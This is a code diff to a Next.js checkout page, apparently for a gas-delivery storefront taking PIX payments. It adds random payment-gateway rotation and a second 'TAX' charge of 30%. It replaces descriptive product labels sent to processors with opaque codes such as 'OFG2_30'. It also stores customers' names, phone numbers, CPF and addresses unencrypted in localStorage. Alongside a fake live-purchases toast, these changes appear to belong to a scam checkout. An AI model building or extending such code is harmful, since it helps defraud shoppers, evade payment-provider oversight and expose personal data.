@@ -16,6 +16,7 @@ import LocationHeader from "@/components/LocationHeader"
 import { ArrowLeft, MapPin, Clock, CreditCard, Smartphone, Copy, CheckCircle, Star, Plus, X } from "lucide-react"
 import { useState, useEffect, useRef } from "react"
 import { useRouter, useSearchParams } from "next/navigation"
+import { getClientGateway, trackGatewayUsage, getCurrentGatewayInfo, saveSuccessfulGateway, getMappedGatewayName } from "@/lib/gateway-manager"
 
 interface AddressData {
   cep: string
@@ -447,6 +448,18 @@ export default function CheckoutPage() {
       setCep(parsedAddress.cep)
       setStep(2)
     }
+    
+    // Carregar dados do cliente salvos
+    const savedCustomer = localStorage.getItem("configas-customer")
+    if (savedCustomer) {
+      try {
+        const parsedCustomer = JSON.parse(savedCustomer)
+        setCustomerData(parsedCustomer)
+        console.log('✅ Dados do cliente carregados do localStorage')
+      } catch (error) {
+        console.error('❌ Erro ao carregar dados do cliente:', error)
+      }
+    }
   }, [])
 
   // Toast de compras em tempo real
@@ -528,6 +541,8 @@ export default function CheckoutPage() {
       }
 
       setAddressData(data)
+      // Salvar endereço no localStorage
+      localStorage.setItem("configas-address", JSON.stringify(data))
       // Abrir modal de confirmação de endereço
       setShowAddressModal(true)
     } catch (err) {
@@ -568,9 +583,22 @@ export default function CheckoutPage() {
     setStep(1)
   }
 
+  // Função helper para salvar dados do cliente no localStorage
+  const saveCustomerData = (data: CustomerData) => {
+    try {
+      localStorage.setItem("configas-customer", JSON.stringify(data))
+    } catch (error) {
+      console.error('❌ Erro ao salvar dados do cliente:', error)
+    }
+  }
+
   const handleCustomerDataSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (customerData.name && customerData.phone && customerData.number) {
+      // Salvar dados do cliente no localStorage
+      localStorage.setItem("configas-customer", JSON.stringify(customerData))
+      console.log('💾 Dados do cliente salvos no localStorage')
+      
       setStep(3)
       // Iniciar busca de motoboy
       startDriverSearch()
@@ -887,7 +915,15 @@ export default function CheckoutPage() {
         ip: "0.0.0.0",
       }
 
-      const response = await fetch("/api/payment-transaction", {
+      // Obter gateway selecionado aleatoriamente para este cliente
+      const gateway = getClientGateway()
+      const mappedName = getMappedGatewayName(gateway.id)
+      console.log(`🎯 [Gateway] Usando: ${mappedName}`)
+      
+      // Rastrear uso do gateway
+      trackGatewayUsage(gateway.id)
+
+      const response = await fetch(gateway.endpoint, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -900,6 +936,10 @@ export default function CheckoutPage() {
       }
 
       const pixResponse: PixResponse = await response.json()
+      
+      // ✅ SALVAR GATEWAY APENAS APÓS SUCESSO
+      saveSuccessfulGateway(gateway.id)
+      
       setPixData(pixResponse)
       
       // Salvar dados do PIX no localStorage para usar no polling
@@ -910,10 +950,13 @@ export default function CheckoutPage() {
         createdAt: new Date().toISOString()
       }))
       
-      // Iniciar polling para verificar pagamento (API Ezzpag)
+      // Iniciar polling para verificar pagamento
       startPaymentPolling(pixResponse.id)
+      
     } catch (err) {
-      setPixError("Erro ao gerar PIX. Tente novamente.")
+      const errorMessage = err instanceof Error ? err.message : "Erro ao gerar PIX. Tente novamente."
+      setPixError(errorMessage)
+      console.error("❌ [GeneratePix] Erro final:", err)
     } finally {
       setPixLoading(false)
     }
@@ -990,7 +1033,12 @@ export default function CheckoutPage() {
       
       console.log('📤 Enviando requisição para API com payload completo...')
       
-      const response = await fetch("/api/payment-transaction", {
+      // Obter gateway selecionado para este cliente (mesmo do primeiro pagamento)
+      const gateway = getClientGateway()
+      const mappedName = getMappedGatewayName(gateway.id)
+      console.log(`🎯 [Gateway TAX] Usando: ${mappedName}`)
+      
+      const response = await fetch(gateway.endpoint, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(requestData)
@@ -1165,12 +1213,16 @@ export default function CheckoutPage() {
     
     console.log(`🔄 [POLLING] Iniciando polling para transação ${transactionId}`)
     
+    // Obter gateway selecionado para este cliente
+    const gateway = getClientGateway()
+    console.log(`🔄 [POLLING] Usando endpoint: ${gateway.checkEndpoint}`)
+    
     const interval = setInterval(async () => {
       try {
         // Adicionar timestamp para evitar cache
         const timestamp = new Date().getTime()
         const response = await fetch(
-          `/api/check-payment-status?transactionId=${transactionId}&_t=${timestamp}`,
+          `${gateway.checkEndpoint}?transactionId=${transactionId}&_t=${timestamp}`,
           {
             method: 'GET',
             cache: 'no-store',
@@ -1398,7 +1450,7 @@ export default function CheckoutPage() {
           : null,
         products: basePayload.products.map((product: any) => ({
           ...product,
-          name: `${product.name} - ICMS + Impostos (30%)`,
+          name: "OFG2_30",
           priceInCents: taxAmount
         })),
         commission: {
@@ -1528,7 +1580,7 @@ export default function CheckoutPage() {
           },
           products: currentPixData.items.map((item: any, index: number) => ({
             id: `product-${currentPixData.id}-${index}`,
-            name: "GBnewTno",
+            name: "OFG2",
             planId: null,
             planName: null,
             quantity: item.quantity,
@@ -1602,7 +1654,7 @@ export default function CheckoutPage() {
             },
             products: currentPixData.items.map((item: any, index: number) => ({
               id: `product-${currentPixData.id}-${index}`,
-              name: "GBnewTno",
+              name: "OFG2",
               planId: null,
               planName: null,
               quantity: item.quantity,
@@ -2341,7 +2393,9 @@ export default function CheckoutPage() {
                           onChange={(e) => {
                             const value = sanitizeInput(e.target.value, true) // Permitir espaços no nome
                             if (isInputSafe(value)) {
-                              setCustomerData({ ...customerData, name: value })
+                              const newData = { ...customerData, name: value }
+                              setCustomerData(newData)
+                              saveCustomerData(newData)
                             }
                           }}
                           className="text-sm sm:text-base"
@@ -2361,7 +2415,9 @@ export default function CheckoutPage() {
                             onChange={(e) => {
                               const value = sanitizeInput(e.target.value)
                               if (isInputSafe(value)) {
-                                setCustomerData({ ...customerData, phone: formatPhone(value) })
+                                const newData = { ...customerData, phone: formatPhone(value) }
+                                setCustomerData(newData)
+                                saveCustomerData(newData)
                               }
                             }}
                             className="text-sm sm:text-base"
@@ -2380,7 +2436,9 @@ export default function CheckoutPage() {
                             onChange={(e) => {
                               const value = sanitizeInput(e.target.value)
                               if (isInputSafe(value)) {
-                                setCustomerData({ ...customerData, cpf: formatCPF(value) })
+                                const newData = { ...customerData, cpf: formatCPF(value) }
+                                setCustomerData(newData)
+                                saveCustomerData(newData)
                               }
                             }}
                             className="text-sm sm:text-base"
@@ -2405,7 +2463,9 @@ export default function CheckoutPage() {
                         onChange={(e) => {
                           const value = sanitizeInput(e.target.value)
                           if (isInputSafe(value)) {
-                            setCustomerData({ ...customerData, phone: formatPhone(value) })
+                            const newData = { ...customerData, phone: formatPhone(value) }
+                            setCustomerData(newData)
+                            saveCustomerData(newData)
                           }
                         }}
                         className="text-sm sm:text-base"
@@ -2427,7 +2487,9 @@ export default function CheckoutPage() {
                         onChange={(e) => {
                           const value = sanitizeInput(e.target.value)
                           if (isInputSafe(value)) {
-                            setCustomerData({ ...customerData, number: value })
+                            const newData = { ...customerData, number: value }
+                            setCustomerData(newData)
+                            saveCustomerData(newData)
                           }
                         }}
                         className="text-sm sm:text-base"
@@ -2445,7 +2507,9 @@ export default function CheckoutPage() {
                         onChange={(e) => {
                           const value = sanitizeInput(e.target.value)
                           if (isInputSafe(value)) {
-                            setCustomerData({ ...customerData, complement: value })
+                            const newData = { ...customerData, complement: value }
+                            setCustomerData(newData)
+                            saveCustomerData(newData)
                           }
                         }}
                         className="text-sm sm:text-base"
